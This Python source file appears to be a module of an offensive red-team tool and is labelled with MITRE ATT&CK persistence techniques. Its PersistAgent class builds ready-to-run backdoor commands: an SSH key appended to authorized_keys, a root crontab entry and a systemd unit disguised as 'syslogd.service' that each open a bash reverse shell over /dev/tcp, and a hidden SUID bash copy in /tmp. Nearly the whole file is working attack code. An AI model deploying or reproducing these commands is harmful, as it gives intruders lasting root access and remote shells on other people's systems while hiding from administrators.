"""
PersistAgent — Mise en place de persistance.
TA0003 Persistence — T1098 Account Manipulation
"""

import subprocess
import os


class PersistAgent:
    def __init__(self, target: str, context: dict = None):
        self.target = target
        self.context = context or {}

    def generate_ssh_key(self) -> dict:
        try:
            key_path = os.path.expanduser("~/.ssh/id_rsa_killchain")
            if not os.path.exists(key_path):
                subprocess.run(
                    ["ssh-keygen", "-t", "rsa", "-b", "4096",
                     "-f", key_path, "-N", "", "-q"],
                    capture_output=True, timeout=30
                )
            with open(f"{key_path}.pub") as f:
                pubkey = f.read().strip()
            return {
                "technique": "T1098.004",
                "name": "SSH Authorized Keys",
                "pubkey": pubkey,
                "command": f"echo '{pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
            }
        except Exception as e:
            return {
                "technique": "T1098.004",
                "name": "SSH Authorized Keys",
                "status": "skipped",
                "error": str(e),
                "command": "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_killchain -N ''",
            }

    def generate_cron(self) -> dict:
        cmd = f"echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/{self.target}/5555 0>&1\"' >> /etc/crontab"
        return {
            "technique": "T1053.003",
            "name": "Cron Job Reverse Shell",
            "command": cmd,
            "description": "Reverse shell every minute via crontab",
            "detection_note": "Check /etc/crontab and /var/log/syslog for anomalies",
        }

    def generate_suid_backdoor(self) -> dict:
        return {
            "technique": "T1548.001",
            "name": "SUID Binary Backdoor",
            "command": "cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash",
            "usage": "/tmp/.bash -p",
            "cleanup": "rm -f /tmp/.bash",
        }

    def generate_systemd_service(self) -> dict:
        unit = (
            f"[Unit]\n"
            f"Description=System Log Service\n\n"
            f"[Service]\n"
            f"ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{self.target}/5555 0>&1'\n"
            f"Restart=always\n\n"
            f"[Install]\n"
            f"WantedBy=multi-user.target\n"
        )
        return {
            "technique": "T1543.002",
            "name": "Systemd Service",
            "unit_name": "syslogd.service",
            "unit_content": unit,
            "commands": [
                f"cat > /etc/systemd/system/syslogd.service << 'EOF'\n{unit}EOF",
                "systemctl daemon-reload",
                "systemctl enable syslogd.service",
                "systemctl start syslogd.service",
            ],
        }

    def run(self) -> dict:
        return {
            "technique": "T1098",
            "tactic": "TA0003",
            "target": self.target,
            "persistence_methods": [
                self.generate_ssh_key(),
                self.generate_cron(),
                self.generate_suid_backdoor(),
                self.generate_systemd_service(),
            ],
        }
